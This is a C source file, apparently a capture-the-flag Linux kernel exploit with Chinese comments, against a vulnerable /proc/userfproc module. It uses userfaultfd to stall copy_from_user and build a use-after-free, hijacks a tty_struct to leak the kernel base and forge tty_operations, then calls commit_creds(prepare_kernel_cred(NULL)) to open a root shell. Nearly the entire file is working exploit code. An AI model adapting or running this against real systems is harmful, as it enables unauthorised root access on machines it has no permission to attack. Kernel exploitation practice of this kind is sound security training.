//gcc -masm=intel -static exploit.c -o exploit
//home/race_condition/userfaultfd/exploit

#define _GNU_SOURCE
#include "mykernelpwn.h"

#define tty_struct_size 0x2e0
#define ptm_unix98_ops 0xffffffff8208eea0
#define pty_unix98_ops 0xffffffff8208ed80
#define commit_creds 0xffffffff810b7fb0
#define prepare_kernel_cred 0xffffffff810b8360
#define work_for_cpu_fn 0xffffffff810ac640

struct userf_note {
    size_t idx;
    size_t size;
    char* buf;
};

struct note_data {
    size_t size;
    char* data;
};

int userf_fd;
sem_t evil_add_sem, evil_edit_sem;
char* uffd_buf;
char  temp_page[0x1000] = { "ccelend1" };

/*notebook[idx]->size=size
copy_from_user(userfbuf, buf, 0x100);
notebook[idx]->data=_kmalloc(size)*/
void userf_add(size_t idx, size_t size, char* buf)
{
    struct userf_note note = {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(userf_fd, 0x112233, &note);
}

/*
notebook[idx]->size=new_size
v7=krealloc(notebook[idx]->data, new_size)
copy_from_user(userfbuf, buf, 0x100) 卡在这里
if notebook[idx]->size==0, notebook[idx]->data=0
notebook[idx]->data=v7 修改指针
*/
void userf_edit(size_t idx, size_t size, char* buf)
{
    struct userf_note note = {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(userf_fd, 0x223344, &note);
}

// kfree(&notebook[idx]->data)
void userf_del(size_t idx)
{
    struct userf_note note = {
        .idx = idx,
    };
    ioctl(userf_fd, 0x334455, &note);
}

void userf_gift(void* buf)
{
    struct userf_note note = {
        .buf = buf,
    };
    ioctl(userf_fd, 0x445566, &note);
}

// 把 notebook[idx]->data 数据读到 buf
ssize_t userf_read(int idx, void* buf)
{
    return read(userf_fd, buf, idx);
}

// buf 数据写到 notebook[idx]->data
ssize_t userf_write(int idx, void* buf)
{
    return write(userf_fd, buf, idx);
}

void* fix_size_by_add(void* args)
{
    // evil_add_sem 信号量-1
    sem_wait(&evil_add_sem); 
    userf_add(0, 0x60, uffd_buf);
}

void* construct_uaf(void* args)
{
    // evil_edit_sem 信号量-1
    sem_wait(&evil_edit_sem); 
    userf_edit(0, 0, uffd_buf);
}

int main(int argc, char** argv, char** envp)
{
    struct note_data kernel_notebook[0x10];
    struct tty_operations fake_tty_ops;

    pthread_t uffd_monitor_thread, add_fix_size_thread, edit_uaf_thread;

    size_t fake_tty_struct_data[0x100], tty_ops, orig_tty_struct_data[0x100];
    size_t tty_struct_addr, fake_tty_ops_addr;
    int tty_fd;

    save_status();
    bind_core(0);

    // 初始化指向信号量结构的指针 evil_add_sem, evil_edit_sem, 线程共享且初值为0
    sem_init(&evil_add_sem, 0, 0);
    sem_init(&evil_edit_sem, 0, 0);

    // 打开 proc
    userf_fd = open("/proc/userfproc", O_RDWR);
    if (userf_fd < 0) {
        err_exit("Failed to open /proc/userfproc!");
    }

    // 分配匿名内存 uffd_buf，并没有实际分配物理页面
    note_info("Fegister userfaultfd...");
    uffd_buf = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, 
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    // 通过 userfaultfd 系统调用注册一个 userfaultfd
    register_userfaultfd_for_thread_stucking(&uffd_monitor_thread, uffd_buf, 0x1000);

    // 获得一个 tty-size object
    note_info("Allocating tty_struct-size object...");
    // "ccelend1ccelend1" 写入 userfbuf
    userf_add(0, 0x10, "ccelend1ccelend1");
    userf_edit(0, tty_struct_size, temp_page);

    /**
     * construct UAF by userfaultfd.
     * Note that we need to sleep(1) there to wait for the kfree() to be done,
     * so that the UAF object can be regetted later.
    */
    note_info("Constructing uaf on tty_struct...");
    // 新开 edit 线程通过 krealloc(0) 将其释放，此时有一个 tty_struct_size 空闲块
    // 因为 uffd_buf 并没有实际分配物理内存页, 所以 copy_from_user 会通过 userfaultfd 卡住
    pthread_create(&edit_uaf_thread, NULL, construct_uaf, NULL);
    // notebook[0]->size 0修复为 0x60，copy_from_user 通过 userfaultfd 卡住
    pthread_create(&add_fix_size_thread, NULL, fix_size_by_add, NULL);

    // evil_edit_sem 信号量+1
    sem_post(&evil_edit_sem); 
    sleep(1);
    /**
     * fix notebook[0]->size.
     * Note that we need to sleep(1) there to wait for the `size` to be fixed.
    */
    // evil_add_sem 信号量+1
    sem_post(&evil_add_sem); 
    sleep(1);

    // tty_struct 分配到 notebook[0]->data 指向的堆
    note_info("Leaking kernel_base by tty_struct...");
    tty_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    
    // 原本的 tty_struct 保存到 orig_tty_struct_data，为后来的恢复做准备
    userf_read(0, orig_tty_struct_data); 
    if (*(int*) orig_tty_struct_data != 0x5401) {
        err_exit("Failed to hit the tty_struct!");
    }

    tty_ops = orig_tty_struct_data[3];
    kernel_offset = ((tty_ops & 0xfff) == (pty_unix98_ops & 0xfff) 
                       ? (tty_ops - pty_unix98_ops) : tty_ops - ptm_unix98_ops);
    kernel_base += kernel_offset;
    printf("\033[32m\033[1m[+] Kernel offset: %p\033[0m\n", kernel_offset);
    printf("\033[32m\033[1m[+] Kernel base: %p\033[0m\n", kernel_base);

    /* construct fake tty_ops */
    note_info("Construct fake tty_operations...");
    fake_tty_ops.ioctl = kernel_offset + work_for_cpu_fn;
    userf_add(1, 0x50, temp_page);
    userf_edit(1, sizeof(struct tty_operations), temp_page);
    // 把 fake_tty_ops 数据写入 notebook[1]->data 指向的堆
    userf_write(1, &fake_tty_ops); 

    /* get kernel addr of tty_struct and tty_ops by gift */
    note_info("Leaking kernel heap addr by gift...");
    userf_gift(&kernel_notebook);
    tty_struct_addr = kernel_notebook[0].data;
    fake_tty_ops_addr = kernel_notebook[1].data;
    printf("\033[32m\033[1m[+] Tty_struct at: %p\033[0m\n", tty_struct_addr);
    printf("\033[32m\033[1m[+] Fake_tty_ops at: %p\033[0m\n", fake_tty_ops_addr);


    /* prepare_kernel_cred(NULL) */
    note_info("Triger commit_creds(prepare_kernel_cred(NULL)) and fix tty...");
    memcpy(fake_tty_struct_data, orig_tty_struct_data, 0x2e0);
    fake_tty_struct_data[3] = fake_tty_ops_addr;
    fake_tty_struct_data[4] = kernel_offset + prepare_kernel_cred;
    fake_tty_struct_data[5] = NULL;
    userf_write(0, fake_tty_struct_data);
    // 调用 tty_operations 的 ioctl 接口执行 work_for_cpu_fn，再执行 prepare_kernel_cred(NULL)
    ioctl(tty_fd, 233, 233);

    /* commit_creds(&root_cred) */
    userf_read(0, fake_tty_struct_data);
    fake_tty_struct_data[4] = kernel_offset + commit_creds;
    // fake_tty_struct_data[6] 保存了 prepare_kernel_cred(NULL) 的返回值
    fake_tty_struct_data[5] = fake_tty_struct_data[6];
    fake_tty_struct_data[6] = orig_tty_struct_data[6];
    userf_write(0, fake_tty_struct_data);
    ioctl(tty_fd, 233, 233);

    // 修复 tty_struct 结构体
    memcpy(fake_tty_struct_data, orig_tty_struct_data, 0x2e0);
    userf_write(0, fake_tty_struct_data);

    /* pop root shell */
    get_root_shell();

    return 0;
}